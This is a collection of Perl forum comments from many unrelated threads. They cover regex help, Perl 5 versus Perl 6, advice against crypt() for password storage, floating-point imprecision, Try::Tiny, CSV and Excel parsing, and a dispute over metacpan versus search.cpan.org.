Parallelization is often a black art. One must pick the right approach based upon the problem being solved as well as platform. This is a topic that has launched thousands of thread in perl as well as in other languages. I do have two pieces of advice that I have learned: 1. Consult the monks at perlmonks.org. 2. Check out a relatively new player- MCE (https://metacpan.org/pod/MCE) The monks can be a bit crotchety at times, but they will lead you to the right questions and thus the right answers. MCE does not provide anything that can't be done without it, but it makes hard things much easier. I now use it as my starting point and refactor older routines to use it in order to make them easier for others to follow.
Just don't forget that the existence of Perl6 reinvigorated the Perl5 community. You may prefer Perl5 to Perl6, but there's no need to be hostile, Perl6 saved Perl5 too.
I apologize if any part of my statements appear hostile instead of factual. I do not discount that Perl 6 inspired much development of Perl 5. That does not change that they are developed by unrelated communities.
What does this have to do with Perl other than the domain it's on?
I don't see a connection either. Removing it for now. The submitter can poke me if they have an explanation.
This thread is an island where people flash upvotes from the signal lamps on their passing ships, but don't stop to have a nice cup of tea, apparently.
Ahoy, matey
I'm pretty noob to perl, just got my first programming gig and we essentially only write in perl so here I am (we do a shit ton of text parsing). What is good about perl that other languages don't have? I understand the regex features are extremely powerful and I've come to learn that perl has a nice emphasis on scope (over something like python which I've actually come to dislike), but why use perl for anything other than processing text? Edit: this escalated quickly. I'm young and am having my first exposure to Perl in my first job. My university taught only C/C++. I've picked up python along the way and do some Android java programming. My experience with perl is positive. Convince me to stay on the island!!
&gt; but why use perl for anything other than processing text? You are part of the problem. Why in the world could perl not be used for different things other than processing text? I have written web application backends in it, SNMP-based switch management tool, gaming site scoreboarding and aggregation web, web gallery backend... Perl is universal language. And mind you, regular expressions are not supposed to be used in place of actual parsers.
I learnt most of my Perl from [perlmonks](http://perlmonks.org/)... Although to be fair this was probably almost 15 years ago. There's some really great content and some extremely talented individuals on there. 
Mind you, I didn't claim it isn't a universal language. Mind you, we use perl for everything not just text processing. Mind you, you didn't answer my question. 
The company I work for is 10ish+ years old. I didn't create the company nor does my question have anything to do with what the company does. Our web backend is perl (modperl, cgi, the occasional fastcgi), our APIs are in perl, and we use DBI. Still, why perl? 
&gt; Still, why perl? And why not? Is python fundamentally better? What are even the other options? If you're using Java/C#, it's probably because you must. For web applications you need JavaScript at least for the front end.
Please use the reply link to reply to specific comments. And well, in that case you want to hire a developer for a short contract. Discuss it with your manager. If it cannot be released then it MUST be done under NDA, otherwise you'd likely be breaking contract with your company. Keep in mind that due to the nature of perl source code "releasing" is practically identical with "posting it or parts of it for people to look at". Also keep in mind that you are asking people to do work for you here.
&gt; No other language has that, even now. A lot of languages have big collections of libraries! CPAN probably isn't the biggest and best anymore.
I'm not saying I don't like perl. In fact I prefer it to python at this point. I'm coming from a C, C++ emphasized education focusing on performance and modularity. What tasks does perl do better than other languages? My 3 favorite parts about perl at the moment are: Regex perl 1 liners from bash. The flexibility of hash references. The flexibility of the pseudo "oop/building data structures" functionalities (bless, classes, etc) Edit: my question also has nothing to do with me being dissatisfied with our perl stack, which I'm not at all, nor do I think anyone wants to move away from perl. Im just wondering what perls advantages are over other languages. Edit 2: we also do have high turnover and my job was actually recently on the line but actually my manager ended up getting fired not me lol. The high turnover is one of the main things dissuading me to focus on perl.
Is python fundamentally better? Is something else fundamentally better? That's literally my question... 
Also, apologies for the double response, but I didn't mean to say we're willy nilly script kiddies processing text. The product we provide as a business relies mainly on "text processing". Our co-founder developed all the original code in perl and some C. What I meant to say is we've built our core "text processing" modules in perl and then built the surrounding architecture, also in perl. Aside from the principle of keeping everything in one language for the sake of hiring developers and decreasing complexity, are there architectural advantages of perl that make it better than other languages. 
well, in 2017 maybe not, in 2015 when I had a hard look at this problem while considering my career choices CPAN was still the biggest and the best.
Also one of the most dreaded and least wanted, not exactly the best survey to point people towards Perl. http://stackoverflow.com/insights/survey/2017/#technology-most-loved-dreaded-and-wanted-languages
So the way I have it in the example works?
That hasn't worked out well so far, given what people think of perl. It's also untrue.
Basically no. All of the languages have benefits and drawbacks that may or may not apply to your needs. The biggest one being "whether you can find people that know it".
Not sure I understand the question. Both of those regexes would do what you describe and result in the same string, assuming your input string doesn't contain any instances of 'TEST' (any case, due to /i) other than in 'ON FOR TEST'.
I dont have A simple way of trying it right now that's why am asking you guys. Can you please just tell me?
Why can't it be true? What strict criteria makes it untrue? We should try to get people excited about Perl 6 being a modern reboot. It's all about perception and the culture around Perl. I can't convince people Perl 5 is great when they ask about object orientedness and I have to tell them about Moo, Moose, and Mouse. We need a language with that sort of stuff built it if Perl is going to survive.
Not sure if you want to avoid matching substrings, but it can help to now that you can avoid repeating the matched string with `$&amp;`. In addition, when you want to operate on `$_` you can just avoid writing it: s/DIAGNOSTIC TEST ON FOR TEST/$&amp;;/gi;
It is factual, currently.
I'm one of those hardware designers. What is beneficial about moving to Python or Ruby?
I think this just tells us that Perl programmers are older (thus, more experienced). It's labeled "top paying technology" but, I believe it ends up being a proxy for another factor in the case of Perl. Go may be similar; it is new but not new-fangled...I've noticed a ton of older devs jumping to Go (I think it fits comfortably for people who grew up on C and Perl and UNIX). And, of course, it's being used heavily in high dollar fields, like devops, cloud, scalability, (all modern names of system administration and systems engineering, where Perl once ruled the roost). Not saying it isn't interesting; the whole survey is worth a read (Perl is tied for 13th or 14th place, I think, in terms of popularity, side by side with Go and a couple of others..though Go is rising fast, and Perl is slowly declining in relative popularity). Just saying that I don't think this means someone can increase their market value remarkably merely by learning Perl. Without the 20+ years experience a lot of full-time Perl programmers have, it's not going to have the same impact on salary.
I'm also one of those hardware engineers. Our policy is to write new things in Python when possible. The main benefit I would say is that it's harder to write really bad code in Python. And we're all hardware engineers not programmers. I'm tired of seeing people test empty strings by using a regex. 
It's not harder to write bad python, there are two factors that make it seem like it though: - it is harder to write python that looks ugly, and few people are aware of Perl::Tidy fixing that 100% - it is more likely that a python dev learned it more recently, thus from higher quality materials than "first google hit", thus any given py dev has a higher chance of knowing how to write quality code † Try to actually look more deeply into causes, instead of stopping at the first correlation and labeling it a cause, please. :) † Seriously, consider how before Ovid's Beginning Perl there was no *good* (i.e. focused on discipline and quality) Perl teaching book out for newbies, and how even nowadays people will recommend the "Camel book", despite it failing to highlight strict and warnings.
Why? They *are* different, competing languages. I have very little interest in perl 6, but I continue to use and enjoy Perl 5 in many projects. The perl community is diverse and varied, I'm sure there are plenty (such as yourself) with differing opinions. It's a shame we have two totally different languages with the same name, but that's the situation we're stuck with.
This seems useful. Thanks!
It was. &gt; Successful. &gt; &gt; Goal was $37,000 pledged $40,404 by 563 backers. 
Slightly related, https://www.kickstarter.com/projects/1422827986/heroes-of-the-revolution-t-shirts-larry-wall
I don't think your understanding of how the -p switch is correct. Everything I've read says it's a while &lt;&gt; loop, which processes one line at a time. Taking a closer look at your regexps, I don't see why perl would have any issue with it, even working a line at a time. FYI, I fixed a bug where the while loop was operating on $fh, which doesn't exist in the code. I realized there were a couple bugs in that code. I should have cleaned them up now, but without knowing the input and expected output, I could have a few bugs in there still.
First of all, thanks for the sample code. Maybe I'm confusing Perl's behaviour with Bash's, where it's damned near impossible to operate on newlines.
Yes, by default `perl -p` (or `-n`) reads line-by-line, breaking on newlines. To get it to slurp the entire file as one line, you can give it a non-existent end-of-line character by adding `-0777` . See the section on `-0` in `perldoc perlrun` for details.
See my reply to the above about File::Slurp.
Thanks!
I should have answered your actual question: to get perl to read an entire file in as one line within a script, see the $/ variable (also known as $INPUT_RECORD_SEPARATOR) in `perldoc perlvar`. I don't think you want to do that with a 3.8GB file, though. I don't see anything in your code that shouldn't work line-by-line, so if you're having trouble with part of it, maybe you can post it so we can help. williadc's equivalent code to yours should work. One thing I noticed: if you want to replace newlines with spaces, and then compress all consecutive spaces into single spaces, you can do that in one pass with `/[\n ]+/ /g` . If you want to compress all whitespace (including tabs), it's a bit simpler: `/\s+/ /g` .
Thanks for the tip!
It would be useful if you gave more background about your own level of experience and what you hope to learn/achieve with Perl. If you want something in depth: a book on the language and a project idea to work towards, rather than tutorials is probably the place to go. A good book if you are already quite experienced at programming and have some perl knowledge is http://modernperlbooks.com/books/modern_perl_2016/
The Perl Conference ( previously YAPC ) is the big conference. There is also significant Perl content at OSCON. Then there are smaller, regional events in Florida, MIlwakee, etc. The PPW in Pittsburgh would be closest to you. Google is your friend
You will need to know about strings (and other data types) and how to do things like looping, in order to learn more advanced things. I could tell you how to do something super advanced and useful, but you won't understand it, because you don't know the basics. I agree with /u/MattEOates. We need more information about what you hope to do, and your knowledge about programming in general.
I think the O'Reilly book [Learning Perl](http://a.co/0DtCVvb) has a very solid reputation as a great introduction to Perl. And the "[camel book](http://a.co/djX2pgx)" is the gold standard in Perl documentation, of course.
There's more than one Perl language to choose from. If you're interested in Perl 6, check out https://learnxinyminutes.com/docs/perl6/ , http://perl6intro.com/ , and https://docs.perl6.org/language.html , there are also some tutorials on https://perl6.party/
**fatal and error**: I use `fatal` as well as `error` level, `fatal` is when we want to bail out after a serious error and `error` for continuing after an error. Surely there are cases when we want to continue after an error. For example when copying/processing several files, when there is an error copying a file and we want to skip to the next file instead of bailing out. Think of `cp`, `mv`, `rsync`, `tar` or many other Unix utilities. In fact, one of the most annoying Unix utilities I've ever used is `rdiff-backup` (although this is like a decade ago and its behavior might have changed now). This backup utility decided to bail out after non-serious error, and I realize several days/weeks later when my servers never completed their backups only because some silly errors like a file being modified or changes its mtime while being copied. One can argue like in the article that for the stop-after-an-error case we use `error` level and for continue-after-error case we use `warn`. But I also like to differentiate cases when something is merely a warning vs when something is an error, much like Perl's warning and error (like `$!` or `$?`). **trace and debug**: I also use `trace` as well as `debug`. I find it useful because sometimes I want to see *some* debugging output and sometimes I want *more* debugging output. Although this is inconsistent from my one app to another and nowadays I get confused from time to time on which of the two to use on which case. I have to improve my coding guidelines on this.
[Crypt::Libcrypt](https://github.com/jonathanstowe/Crypt-Libcrypt) is a straight interface to Unix `crypt()`, which has been completely broken for a long, long time. It uses DES, which has a small key size and can be easily broken on modern computers. It shortens your password to 8 ASCII chars, regardless of how many characters you actually typed. It also has only 12 bits of salt. Gawker had their user database stolen in 2010, and had a whole bunch of user passwords cracked because they were using `crypt()`: https://www.lightbluetouchpaper.org/2010/12/15/the-gawker-hack-how-a-million-passwords-were-lost/ While there is probably a need for the library itself in Perl6, it should never be recommended for new code. Bcrypt is the current best practice, and Argon2 is the new up-and-comer (meaning you should wait a little while to see how it plays out). If the Bcrypt interface is broken on Perl6, then fix it. If it's not fixed and you need to do *something* right now, then storing passwords with SHA512 and 64 bits of salt is still better than `crypt()`. You'll still catch flack for not using a modern key derivation function like Bcrypt, but at least it's not `crypt()`.
On most modern operating systems, `crypt(3)` can do SHA512. On GNU systems, for example, you would pass a salt of "$6$*(86 characters of salt)*".
sirhalos, It was tricky to find but this appears to be the [official perl conference](http://www.perlconference.us/tpc-2017-dc/) I hope you get to attend and enjoy it. Activity around the conference should be rapidly picking up this time of year.
You want `sudo cpan ...`
my terminal says permission denied whenever I try downloading anything through it, not sure how to fix
You're going to need to be more specific than that. What are you typing? What are the messages?
Ugh. I'm tired of having to right-click, copy, and reformat MetaCPAN links to search.cpan.org style to get non-ugly online documentation. If people are linking to search.cpan.org, maybe it's for a reason, and you shouldn't pester them.
Nothing wrong with preferring the search.cpan layout, but search.cpan links showing up on google actively harm the perl community as they are almost always severely outdated docs and modules (due to s.c.o links generally referring to a specific module version), and the search.cpan interface (being closed source) is rarely updated to highlight aspects of modules and distributions relevant in this day -- for example, the x_IRC metadata that is now used to display a link to chat with the module authors on metacpan (the banner on the left side of https://metacpan.org/release/Mojolicious for instance). As always I suggest bringing up layout concerns to the metacpan team in IRC or on github (politely) to see if any compromise can be reached.
Sorry, should have said - Linux, CLI only
Can LibreOffice read them? In that case, you could use unoconv to make a "modern" Excel, ODS or CSV file from it first.
Mmmm... I see where you're going... so run LibreOffice headless... worth a crack, nothing else seems to be able to read them...
You have something *generating* data in this ancient format? That's kind of scary. Industrial setting or something?
Here's a sample... https://a.doko.moe/wbixvy.xls
Not me... a client... my job is to tell the server how to read it ..
All those military jet avionics programmers are going to flock to Perl any day now.
If we get rid of it, how will I confuse syntax highlighting text editors?
If you're not limited to Perl, Python's `xlrd` library supports 2.0 https://pypi.python.org/pypi/xlrd I used `x_x` which is a simple wrapper around it on your sample file and it works. https://pypi.python.org/pypi/x_x
 Ah really... brilliant will pursue the python path Thanks so much
close, but you want the `/e` flag to your regex to interpret the replacement as code. see [perlop](https://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators) (look for 'eval') `echo aaaaaaaaa | perl -pe's/([a-z]{4,})*/substr($1, 0, 3)/eg'` Edit: that doesn't work for the `aaabbbb` inputs, using backrefs like: `echo aaaaaaaaabbbbbb | perl -pe's/(([a-z])\g2{2,})/substr($1, 0, 3)/eig'` should
Woah. That use of `\2` in the first part of the regex is blowing my mind. It's like some zen koan that I'm on the edge of understanding. Does `\`*number* always pull out a single character of the saved match? 
Aha! It had never occurred to me that you could *nest* grouping parentheses. That's simply brilliant. Perl never ceases to blow my mind.
It sounds like you need to learn a little bit of basic unix, for you to be safe working with the command line. **Do not** follow recipes on the internet without understanding what they do; you can severely damage your operating system or leave yourself vulnerable to security breaches.
This one gives me the last desired result that you posted: #!/bin/env perl -w use strict; use warnings; open(FD, '&lt;test'); while(&lt;FD&gt;){ /([a-z]{1,3})+?(?{ my $l = $_; print $&amp;; my($c) = $1 =~m#^(.)#i; print $1 if $l =~m#([^$c]{1,3})#xg })/g; } close(FD); I had to copy it by hand so tell me if there's an error on syntax or something! *Edit:* Wrote the rest of the code because of reasons.
http://search.cpan.org/~drolsky/List-AllUtils-0.14/lib/List/AllUtils.pm
&gt; You can easily just click to the latest version. How many people do you think do this, before using the outdated synopsis code/function documentation/suggestions and then giving up because it doesn't work? I'll give you that it's not any more obvious on metacpan when you're on a non-recent release, but at least google is not usually full of old release pages due to how they're indexed. The rest of your comment would be great feedback for the metacpan team.
Another straightforward solution, using \K to avoid the need for a replacement string. Note that \K is only available in perl 5.10 and up.
I'm sorry you see it that way, but it's not about PR, and this isn't a website competition, but a language competition, and search.cpan.org detracts from this for Perl. It's a statement of fact that the website is old, outdated, closed source, and has no clear evidence of being maintained aside from it still running.
My point is that there are some people on this crusade around the perl community badmouthing search.cpan.org and trying to get everyone to use metacpan. search.cpan.org is a resource I've been using since I started using perl and it's been great. Badmouthing, insulting, etc., is only alienating people like me, it's not actually helping your cause. I don't think starting conflict within the community is going to help grow the community, if that really is your goal.
Discussion notwithstanding, I'd just like to quickly point out that metacpan module and release pages include a link to the S.C.O equivalent pages in the lower left corner. For the opposite direction, replace search.cpan.org with search.mcpan.org in the URL.
I find the bracket formatting offensive, other then that appreciate the post. 
He mixes the right way and the wrong way together!
The current state of the art is to use a hashing function designed for passwords like PBKDF2, bcrypt, or scrypt. These hash functions are designed to have a scaling factor that slows the hashing down (preferably to one second for the current crop of machines). Most cryptographically sound hash functions (like SHA512) are also designed to be very fast. For most use cases that is desirable, but for passwords you want a slow hash function. The fewer attempts an attacker can make the better. You can mitigate this somewhat by using a sleep function in your login page, but that doesn't protect leaked database contents, so using something like bcrypt with a proper scaling function is much better.
There are provisions on some systems for using bcrypt with `crypt()`, with a prefix of $2$, $2a$, $2x$, $2y$, or $2b$. This isn't universal on Linux, though, and I don't like relying on all this non-standard stuff with weird character strings, anyway. On Perl5, [Authen::Passphrase](https://metacpan.org/pod/Authen::Passphrase) is 90% of the way there. The one thing it needs is to use a constant time algorithm for verifying the password string (a protection against timing attacks).
This is true but I don't even know why its true -- it seems like a giant hack. If you depend on this feature, you now need to check for glibc2.7 or above, and properly handle when you aren't dealing with it. Otherwise you could just as soon be calling the 'real' crypt() that doesn't have this functionality and instead just uses DES on the first 8 bytes you pass. If you want to use SHA512, you might as well just be using http://search.cpan.org/dist/CryptX-0.012/lib/Crypt/Digest/SHA512.pm (sidenote: I don't really do much perl dev anymore and can't vouch for this actual module, but it seems like what you'd want). If you're handling passwords, you DO NOT want to use SHA either directly or indirectly through crypt(), because SHA is designed to be fast. You want something designed for password use like bcrypt which the OP mentioned.
In all the discussions I've read about sha256/512 vs. bcrypt/scrypt no one seems to mention that current glibc implementations also support an adaptable cost factor for sha2 hash functions (comparable to bcrypt). Even though I'm in favour of bcrypt I can't really see a strong argument against using sha2 in combination with a long salt and an appropiate cost factor. For most cases this should be good enough. In addition glibc per default (afaik) does not support pbkdf2/bcrypt/scrypt, so you are already limited to sha2 hashes if you use /etc/shadow as a password store.
You wrote a lot there, but to have it be valuable, you should actually show how to control the cost factor. ;)
Not worth creating a throwaway GH account for it, but let's start with the home pages: SCO has a simple box that lets you search on authors, modules, and distributions, with a subtle sponsor in the lower right; MC is a billboard full of logos that only lets you search for... some mixture of the three? Okay, let's try a search for "makemaker." In the number one slot, SCO gets us ExtUtils::MakeMaker::FAQ from Perl 5.8.1, which is not ideal, but is fairly close to the mark. MC gets us EV::MakeMaker, which is... something weird. The actual EU::MM link is on the first page for both, but SCO is the winner. Okay, let's look at the EU::MM page on both. Despite using a tiny thin font, MC shows less of the index on the first page, which is a messy stew of icons and colors. And according to Google's page speed thing, MC shows zero content on a phone: https://developers.google.com/speed/pagespeed/insights/?url=https%3A%2F%2Fmetacpan.org%2Fpod%2FExtUtils%3A%3AMakeMaker https://developers.google.com/speed/pagespeed/insights/?url=http%3A%2F%2Fsearch.cpan.org%2F~bingos%2FExtUtils-MakeMaker-7.24%2Flib%2FExtUtils%2FMakeMaker.pm It's just amateur.
Alright, so before i comment on those, let me rephrase them in a way that actually make them useful feedback, properly itemized into issues. Note that these are just rephrasings of your words. 1. frontpage layout is confusing due to the high amount of sponsor mentions and doesn't clearly separate those and usability features 1. search box could use a dropdown to specifically search for a type of item 1. searching for MakeMaker doesn't float the most popular one to the top 1. the TOC spaces lines too much 1. the side menu is confusing due to providing too many things and being too colorful 1. on mobile the POD page for EU::MM fails to actually show pod without scrolling down 1. It's just amateur.
And now commentary on the issues. I'm gonna mark the ones i'll ticket with **✓** 1. Not sure if they can reduce the amount of sponsor mentions, after all they ARE providing money. It can be separated much better though. [**✓**](https://github.com/metacpan/metacpan-web/issues/1864) 1. Would be useful, yes. Should even be relatively easy. [**✓**](https://github.com/metacpan/metacpan-web/issues/1865) 1. If you count how far down EU::MM appears, MC has it at #6, and SCO only #9. As for appropiateness, the module name of the #1 result on MC has a Levenshtein distance of 4 to the search term "makemaker", SCO has a distance of 15. In hard measureable terms SCO is worse. Additionally they're also aware this could be improved more, but for one they're working with ElasticSearch, and for the other there's a lack of ideas as for an exact *programmatic measure* could be used for this. If you have an idea, i would ticket that, otherwise MC is objectively better and aware it's not perfect yet. 1. For one, you can also hide the TOC. For the other, the difference is minimal. Then again, i doubt the line-spacing actually serves a purpose, so: [**✓**](https://github.com/metacpan/metacpan-web/issues/1866) 1. Fully disagree with that one, and have to tell you you're going "this is different from how i'm used to, and change is by default shit". In the site design of MC it's great. The sidebar is global, if you use it for a while you'll start expecting extra tools there. The icons help recognize things without needing to actually read the words. The colors, there's a white background, default browser black text and blue links. Grey section headers. Yellow review stars. Red/green to mark the test result links. This is only 4 colors more than SCO uses; and they help home in when you go onto a page and are looking for a specific bit of info. 1. On my phone (which is fairly normal and boring) the sites operate negligibly similar: [sco](http://i.imgur.com/3TnlMqh.png) [MC](http://i.imgur.com/3TnlMqh.png) MC even has a leg-up as you can hide the TOC with [a single tap](http://i.imgur.com/82InG24.png). I considered ticketing it to hide the TOC by default, but that's pointless. If you're looking things up on metacpan on a phone, being able to jump to the target quickly with a tap is useful. 1. Useless ad-hominem.
I was under no illusion that i could convince someone who is so irrational and emotional about it that he'd throw out things like "just amateur" to actually start using the site. Particularly since you're likely american and would consider such a change of course to be "losing" and "weak". I did hope you might learn from those where you were simple wrong, but it doesn't matter if you don't. My purpose in extracting useful information for tickets to improve MC was fulfilled. Also, you don't actually know why, since you try explaining it, but miss the writing on the wall that you dislike it because it is "change".
The sheer number of typos is very distracting.
As I replied above, there already has been a link to SCO from each module or release page, in the lower left corner. I'm not sure there's a point in making it more obvious, as people who actually want it will know where it is if they care, and everyone else doesn't need to be bothered with it.
.1 (1/10) and .2 (1/5) both can't be represented exactly in binary. .2 just happens to be inaccurate enough to show up in your calculations. You might find https://www.h-schmidt.net/FloatConverter/IEEE754.html interesting. Just remember to initialize your Math::BigFloat objects with strings, so the number doesn't lose precision before Math::BigFloat gets it.
One way around the imprecision of floating point math (not limited to Perl) is to stick with integer math. Instead of iterating from 0 to 27 in increments of 0.2, go from 0 to 270 in increments of 2: my $X = 108; my $Y = 270; my $P = 2; for (my $L = 0; $L &lt;= $Y; $L += 2 * $P) { my $W = ($L + $P) / 10; my $L = $L / 10; print &lt;&lt;CHUNK; G1 X0\tY$L G1 X$X\tY$L G1 X$X\tY$W G1 X0\tY$W CHUNK }
agree. try to use integers only before result output.
Consider using Perl 6. Not only are values precise until specified otherwise, so you never run into this problem in the first place, you can express your ideas better. What you're doing in this loop is the same as taking two elements of an arithmetic series at a time, calling them L and W, and so here's that done explicitly: use v6; my $X = 108; my $Y = 27; my $P = 0.2; my @seq = 0, $P, { $_ + $P } ... $Y; for @seq -&gt; $L, $W { say "G1 X0\tY$L"; say "G1 X$X\tY$L"; say "G1 X$X\tY$W"; say "G1 X0\tY$W"; say ""; } Note that I specified the sequence manually, but Perl can figure out arithmetic series automatically, so this also works my @seq = 0, $P, $P*2 ... $Y; 
Another language that get's it right is Perl 6.
This. Floating point numbers are great for physical quantities, where very close numbers are essentially the same. If the difference between 3.999999999 and 4 is more than 2.5e-8% significant to you, you should probably be using fixed-point math.
...or be using Perl 6 
You can use [Math::BigRat](http://perldoc.perl.org/Math/BigRat.html) to have full on rational numbers similar to those used in Perl 6. Just not quite as transparently. 
Thanks that worked
"is this element in the array" can be determined with List::Util::any -- and List::Util is in core perl (which also means that has many eyes on it keeping it maintained and well tested).
I think sprintf should do this. $bin = sprintf('%b', 15)
Sweet, Ill give that a try, thank you so much!
That's probably normal. Check the documentation for -&gt;start : https://metacpan.org/pod/Mojo::IOLoop#start
Once the event loop starts, it'll keep running until something stops it. There are various ways to do this, but I'd recommend using [Future](https://metacpan.org/pod/Future). In this case, something like: #!/usr/bin/env perl # use strict; use warnings; use feature 'say'; use Mojo::UserAgent; use Mojo::IOLoop; use Future::Mojo; # Parallel non-blocking requests my $ua = Mojo::UserAgent-&gt;new; sub query_metacpan { my ($query) = @_; my $f = Future::Mojo-&gt;new; $ua-&gt;get('https://metacpan.org/search?q=' . $query =&gt; sub { my ($ua, $tx) = @_; $f-&gt;done($tx-&gt;res-&gt;dom-&gt;at('title')-&gt;text); }); return $f; } say for Future-&gt;wait_any( # Don't sit around forever if there's a problem Future::Mojo-&gt;new_timer(10)-&gt;then(sub { Future-&gt;fail('timeout!') }), Future-&gt;needs_all( map query_metacpan($_), qw(mojo chi) ) )-&gt;get; 
There's `# Concurrent non-blocking requests (synchronized with a delay)` example in Mojo::UserAgent synopsis. Looks like what you're trying to do.
Yeah, that's a good point: if it seems like no-one (else) is using your module, then there's an argument for keeping it at 0.x. Borrowing from Ovid's phrase, you can't go to 1.0 if it ain't been battle-tested. This is kind of what prompted me to suggest that Try::Tiny be bumped to 1.x: it's the furthest up-river non-core CPAN distribution. Or put another way, you could argue it's the most battle-tested dist.
1.x implies "this won't change significantly in the future". Yet the dist [still contains this gem](https://metacpan.org/source/ETHER/Try-Tiny-0.28/lib/Try/Tiny.pm#L72-75) which in turn leads to [stuff like that ( read the commit message, and follow the link to video)](https://github.com/ribasushi/dbix-class/commit/e2741c7fd) So as far as `Try::Tiny` is concerned - most definitely not `1.0-ready`.
&gt; leads to [stuff like that](https://github.com/ribasushi/dbix-class/commit/e2741c7fd) Or alternatively [stuff like that](https://github.com/PerlDancer/Dancer2/commit/079ee2376)
Also don't forget that custom phases (`x_*`) and relationships (`x_*`) are allowed, for more flexibility.
`unpack` can also be used, e.g.: unpack("B8", chr(15))
CSVs can definitely have strings and other values in them. The advantage of simple CSVs is that they are just a plain text file, so they can be read pretty easily by stock Perl. For example: &gt; perl -e 'while(&lt;&gt;){function\_to\_process\_line ($\_);}' filename.csv Of course, I would still recommend a [different module](http://search.cpan.org/~ishigaki/Text-CSV-1.94/lib/Text/CSV.pm) for CSVs if you plan on using this for anything more than a one-off, since dealing with complicated data can get messy. For example, if your data contains a comma or a quote, it needs to be escaped in the CSV. Why deal with it yourself when someone already wrote the code for you? 
wait this seems easy. Why should I have doubts that it might not work?
CSV export, at least from Gnumeric, puts quotes around just about any cell content other than a straight number, so that textual specifier shouldn't be a problem. Then there's a CPAN module for splitting a line of that into an array. Or use the function given in *Parsing Comma-Separated Data*, recipe 1.15 in *Perl Cookbook* (my copy is from 1998) as I did. Watch your conversion, though: any quote-marks within cells can screw up the conversion chain. In my case I had a couple of places where *2"* meant two inches, something which Gnumeric's CSV-output converter escaped with '""', and that threw off the cookbook function; I had to clean that up in the formant spreadsheet before things ran right. If you can't go upstream like that to fix it, you might have to do some midstream patching of known artifacts.
Honestly, this is the kind of stuff Perl is pretty good at. If you know what you're doing, it should be pretty easy. 
ok thank you
oh ok, good to know. Thanks
&gt; Sadly the only applications capable of modifying spreadsheets in place are Excel and similar like LibreOffice Calc. It's not quite so cut-and-dried. If the spreadsheet's native file format is compressed XML and you can undo that compression (like Gnumeric, where the native format is gzipped xml, or LibreOffice, where the compression is PKZIP), you can modify that xml in-place (or even generate it in-place from an empty template -- I did that for a resume-generator emitting to LO Writer).
Sure that's a possibility with the XML-based formats now. Requires better knowledge of the format of course.
Not to downplay the issues and whether it could be improved, but as a pure perl module it's unlikely to ever be really speedy. Unfortunately the keyword API requires perl 5.14+, but for any non-CPAN projects I am using [Syntax::Keyword::Try](https://metacpan.org/pod/Syntax::Keyword::Try) as it does not have such a speed penalty, and I also prefer its semantics. Regardless IMO this doesn't really stand in the way of Try::Tiny being a 1.00 status module. It's relied upon by many, many modules without such speed requirements (https://metacpan.org/requires/module/Try::Tiny?sort=[[2,1]] lists 1077 direct dependents), and if a major change occurs sometime in the future there's always 2.00. Leaving it at 0.xx is unlikely to convince anyone it's still beta status in this case. But we probably have still different interpretations of what "ready for 1.00" means.
Take a look at [Mojo::SQLite](https://metacpan.org/pod/Mojo::SQLite) - I'm biased of course but I think it makes working with sqlite much prettier and perlish (as Mojo::Pg does for postgres), and the migrations make my life a lot easier, though it isn't going to help much with that create table statement. I most recently used it for [cpan-meta-browser](https://github.com/Grinnz/cpan-meta-browser/blob/master/cpan-meta-browser.pl). I also like to use [Text::CSV_XS](https://metacpan.org/pod/Text::CSV_XS) for csv generation, so I don't have to worry about quoting or encoding. The OO interface is pretty complicated but in a lot of cases I can use the 'csv' function which is quite simple.
Saw that, dont understand it.
R has a package that's pretty good at reading writing Excel files. It relies on some external libraries for reading and writing those files perhaps you could use those libraries. Here's the details http://readxl.tidyverse.org
The post-increment operator evaluates to the value the expression had before it was incremented. If the line has never been seen before, the count in the hash transitions from 0 to 1, and the expression evaluates to 0 so the line is not printed. If the line has been seen before, then it transitions from, say, 1 to 2 or 4 to 5 or whatever, but regardless the value that it evaluates to is non-zero and the line is printed. Edit: well, not 0, but `undefined`, which acts like zero. 
It's not incrementing a hash, it's incrementing a value in a hash. `%a` is the hash, `$a{'foo'}` is the value corresponding to the key `'foo'`. The keys are lines, the values are a count of the number of times that line has been seen. 
Id still like to know how tho.
The second ? is the "zero or one" operator. /a?b/ matches "ab" or "b" (?:The ) matches "The " (?:The )? matches "The " zero or one times, so qr/(?:The )?Professor/ matches 'The Professor' or 'Professor' Normal parentheses () do the same thing as (?:) parentheses, but create references that can be used later.
Optional non capturing group. Since they also asked about the second '?'.
correct.
In most cases of application-level code there isn't much wrong with plain `eval BLOCK` at all, and I would myself recommend using that. The problem begins in library code where you are in the middle of an "execution pipeline" without having control over any portion of said pipeline. In this case you may need to worry about some, or all of: - preexisting `$@` clobbering in e.g. error handling code - propagation of list/scalar/void context - clobbering of `$@` during stack unwind on perls &lt; 5.14 It's a tradeoff.
Between forks, I tend not to and instead do IPC via threads and thread:: queue instead. Passing objects using freeze/thas from Storable works pretty well, but JSON is good for future scalability, as you can do cross platform multi host data.
What is missing from the spreadsheet they provide?
Basically this. If you read all of Try::Tiny's docs and you understand exactly what each of the issues are, then you are qualified to use eval BLOCK in module code. Here is an example of handling most of the possible issues (other than return context, as the eval's return value is used to indicate the error status to avoid the problems with relying on $@'s value): https://metacpan.org/source/Mojo::SQLite::Database#L111-122 EDIT: Also note that the clobbering of $@ during stack unwind (object destructors) issue on perl &lt; 5.14 can be a problem for application-level code as well. e.g. If a destructor calls eval, even if it succeeds, $@ will now be false, so if you rely on a `if ($@)` check to check for exceptions, it will fail. See https://metacpan.org/pod/Try::Tiny#$@-might-not-be-a-true-value for more detail
 open my $fh, '&lt;:crlf', $file; my $defered = defer sub { say "defer function in closure called!"; close $fh; }; Hmmm. Here's the thing: filehandles are automatically closed when they fall out of scope, but it's considered bad practice to rely on that. Here, you're still relying on a lexical scalar to fall out of scope to close the filehandle. The usual reason, though, is that merely letting it fall out of scope doesn't check for errors. Which nobody seems to do anyway . . .
 open my $fh, '&lt;:crlf', $file; my $defered = defer sub { say "defer function in closure called!"; close $fh; }; Hmmm. Here's the thing: filehandles are automatically closed when they fall out of scope, but it's considered bad practice to rely on that. Here, you're still relying on a lexical scalar to fall out of scope to close the filehandle. The usual reason, though, is that merely letting it fall out of scope doesn't check for errors on the `close()`. Which nobody seems to do anyway . . .
&gt; The data is made in a garbage way Please explain. Perhaps it's not garbage, it's just a format you don't understand. 
The dimensions of the satellites
I would just concentrate on that data then. Grab the rest from an easier source. Your regex will thank you
Assembled in human readable Word Document Tables. I wouldn't want to wrestle with it, honestly. I hope there is a dom traversal that can solve the problem, but I'm not sure what the back end formatting of a doc file looks like but I assume it's shite)
